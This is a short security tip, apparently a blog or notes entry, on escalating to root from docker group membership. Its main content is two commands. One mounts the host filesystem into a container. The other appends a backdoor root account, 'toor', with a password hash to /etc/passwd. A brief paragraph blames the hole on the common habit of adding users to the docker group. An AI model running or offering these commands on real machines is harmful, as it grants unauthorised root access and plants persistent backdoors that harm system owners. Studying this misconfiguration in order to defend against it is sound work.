## Get root

You land on a computer and `id` shows you're part of the `docker` group. Escalate to root with:

```bash
$> docker run -it --rm -v $PWD:/mnt bash

adds backdoor toor:password
#> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
```

The flaw in my example isn't in docker or it's design. It's a misconfiguration that happens all too often. Native Docker needs root access to run but people get tired of needing to type sudo, so they add themselves to the docker group.

https://twitter.com/4lex/status/1035932897407115264
